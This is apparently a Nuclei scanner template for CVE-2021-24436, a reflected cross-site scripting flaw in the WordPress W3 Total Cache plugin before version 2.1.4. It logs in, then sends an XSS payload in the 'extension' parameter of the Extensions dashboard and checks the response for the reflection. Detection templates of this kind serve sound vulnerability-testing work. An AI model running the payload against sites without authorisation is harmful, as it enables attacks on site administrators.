id: CVE-2021-24436

info:
  name: WordPress W3 Total Cache <2.1.4 - Cross-Site Scripting
  author: theamanrawat
  severity: medium
  description: |
    WordPress W3 Total Cache plugin before 2.1.4 is susceptible to cross-site scripting within the extension parameter in the Extensions dashboard, which is output in an attribute without being escaped first. This can allow an attacker to convince an authenticated admin into clicking a link to run malicious JavaScript within the user's web browser, which could lead to full site compromise.
  remediation: Fixed in version 2.1.4.
  reference:
    - https://wpscan.com/vulnerability/3e855e09-056f-45b5-89a9-d644b7d8c9d0
    - https://wordpress.org/plugins/w3-total-cache/
    - https://wpscan.com/vulnerability/05988ebb-7378-4a3a-9d2d-30f8f58fe9ef
    - https://nvd.nist.gov/vuln/detail/CVE-2021-24436
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2021-24436
    cwe-id: CWE-79
    epss-score: 0.001
    epss-percentile: 0.41043
    cpe: cpe:2.3:a:boldgrid:w3_total_cache:*:*:*:*:*:wordpress:*:*
  metadata:
    verified: true
    max-request: 2
    vendor: boldgrid
    product: w3_total_cache
    framework: wordpress
  tags: cve,cve2021,xss,wpscan,wordpress,wp-plugin,wp,w3-total-cache,authenticated

http:
  - raw:
      - |
        POST /wp-login.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        log={{username}}&pwd={{password}}&wp-submit=Log+In
      - |
        GET /wp-admin/admin.php?page=w3tc_extensions&extension="%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E HTTP/1.1
        Host: {{Hostname}}

    cookie-reuse: true
    matchers:
      - type: dsl
        dsl:
          - status_code_2 == 200
          - contains(body_2, '><script>alert(document.domain)</script>&action=view')
          - contains(header_2, "text/html")
        condition: and

# digest: 4a0a00473045022006248c62dbefebca5552a631d8823b1c3e0f6a7f16e45bb1f7cc0888c84eb8a0022100be04da22b37ff45eb351f2d2fdb54ddd2e5d1e7052a4e8f0715dd21686378c04:922c64590222798bb761d5b6d8e72950
